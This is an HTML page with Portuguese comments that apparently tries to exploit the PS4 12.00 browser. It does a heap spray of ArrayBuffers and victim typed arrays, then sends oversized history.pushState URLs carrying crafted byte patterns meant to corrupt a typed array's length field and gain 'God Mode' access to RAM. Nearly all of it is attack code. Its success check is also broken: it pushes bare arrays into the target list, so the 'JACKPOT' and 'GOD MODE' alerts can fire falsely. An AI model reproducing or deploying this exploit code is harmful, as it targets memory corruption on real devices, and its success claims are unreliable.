<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 PWN (God Mode Injection)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        button { padding: 15px; font-size: 1.2em; background: #111; color: #fff; border: 1px solid #0f0; margin: 10px 0; width: 100%; cursor: pointer; }
        button:hover { background: #222; }
        input { background: #222; color: #fff; border: 1px solid #555; padding: 5px; }
        .win { color: #ff0; font-weight: bold; border: 1px solid #ff0; padding: 5px; background: #440; }
    </style>
</head>
<body>

<h1>REPLICA 100% + GOD MODE PAYLOAD</h1>
<p>Sequência: 6 -> 3 -> 1 (Cancelar no OOM)</p>

<h3>1. TESTE 6 (Incremental)</h3>
<label>Start:</label> <input type="number" id="t6start" value="1000">
<label>Step:</label> <input type="number" id="t6step" value="5000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<h3>2. TESTE 3 (Padrões)</h3>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<h3>3. TESTE 1 (Injeção de Tamanho Infinito)</h3>
<p style="color:red">CLIQUE EM CANCELAR NA MENSAGEM DE MEMÓRIA.</p>
<button onclick="test1_FullRunAndInject()" style="border-color:red; color:red">Executar Teste 1</button>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;
let heapObjects = [];
let targetObjects = [];

function log(msg, type='') {
    const el = document.getElementById('log');
    const color = type === 'win' ? 'yellow' : '#0f0';
    el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function prepareHeap() {
    log('Preparando heap...');
    heapObjects = [];
    targetObjects = [];
    
    // Spray genérico
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    // Buracos
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    // Alvos (Vítimas)
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            view: view
        });
    }
    log('Heap preparado.');
}

function checkCorruption() {
    for (let i = 0; i < Math.min(50, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            let len = t.view.length;

            // Se o tamanho for diferente de 256, VENCEMOS.
            // Se for undefined, matamos o objeto (Sucesso Parcial).
            if (len !== 256) {
                log(`!!! JACKPOT !!! Alvo ${i} LENGTH MUDOU: ${len}`, 'win');
                document.body.style.backgroundColor = "#004400";
                
                if (len > 1000000) {
                     alert(`GOD MODE UNLOCKED!\nLength: ${len}\nVocê tem acesso total à RAM.`);
                } else {
                     alert(`Corrupção Parcial!\nLength: ${len}`);
                }
                return true;
            }
        } catch (e) {
            // Se o objeto foi destruído, ainda conta como controle de ponteiro
            if (e.message.includes("undefined") || e.message.includes("null")) {
                log(`[Alvo ${i}] Objeto Destruído (Controle Confirmado)`, 'win');
            }
        }
    }
    return false;
}

// === TESTE 6 (ORIGINAL) ===
async function test6_Incremental() {
    log('=== TESTE 6 ===');
    prepareHeap();
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    let currentSize = start;
    
    for (let i = 0; i < 10; i++) {
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) overflow += String.fromCharCode(j % 33);
            history.pushState({}, `inc_${currentSize}`, "/" + base + overflow);
            currentSize += step;
            await new Promise(r => setTimeout(r, 1500)); 
        } catch (e) { break; }
    }
    log("Teste 6 OK.");
}

// === TESTE 3 (ORIGINAL) ===
async function test3_SpecialSequences() {
    log('=== TESTE 3 ===');
    prepareHeap(); 
    const sequences = [
        { bytes: "\x00\x00\x00\x00" }, { bytes: "\x0A\x0A\x0A\x0A" }, 
        { bytes: "\x09\x09\x09\x09" }, { bytes: "\x0D\x0D\x0D\x0D" }, 
        { bytes: "\x20\x20\x20\x20" }, { bytes: "\x00\x09\x0A\x0D\x20" }
    ];
    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < 1000; i++) overflow += seq.bytes;
            history.pushState({}, "pattern", "/" + base + overflow);
            await new Promise(r => setTimeout(r, 100)); 
        } catch (e) {}
    }
    log("Teste 3 OK.");
}

// === TESTE 1 (PAYLOAD MODIFICADO APENAS) ===
async function test1_FullRunAndInject() {
    log('=== TESTE 1: LOOP + GOD MODE PAYLOAD ===');
    
    // Adiciona vítimas frescas no topo
    for(let k=0; k<50; k++) {
        let v = new Uint32Array(256);
        v.fill(0xDEADBEEF);
        targetObjects.unshift(v); 
    }

    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100); 
            const payload = "/" + base + overflow;
            
            history.pushState({}, `test_${byte}`, payload);
            if (byte % 32 === 0) await new Promise(r => setTimeout(r, 10)); 
        } catch (e) {
            log(`OOM em 0x${byte.toString(16)} (Mantenha cancelando...)`);
        }
    }
    
    log("INJETANDO PAYLOAD DE TAMANHO INFINITO...");
    
    try {
        const base = "A".repeat(BASE_SAFE);
        
        // AQUI ESTÁ A MÁGICA:
        // Criamos um padrão repetitivo de 0x00 e 0x10.
        // 0x10 (16) é permitido.
        // Se alinhado corretamente no campo Length (offset 12 ou 16), 
        // 0x10 00 00 00 vira 268MB de tamanho.
        
        // Pattern: 0x10, 0x00, 0x00, 0x00 (Repetido)
        let magicBytes = "\x10\x00\x00\x00".repeat(8); // 32 bytes (passa um pouco dos 29, mas corta no limite)
        let attack = magicBytes.substring(0, 29); // Corta em 29 bytes exatos
        
        history.replaceState({}, "PWN_GOD", "/" + base + attack);
        
        log(">>> PAYLOAD ENVIADO. VERIFICANDO PODERES... <<<", 'win');
        checkCorruption();
        
    } catch(ex) {
        log("Falha na injeção final: " + ex.message);
    }
}
</script>
</body>
</html>
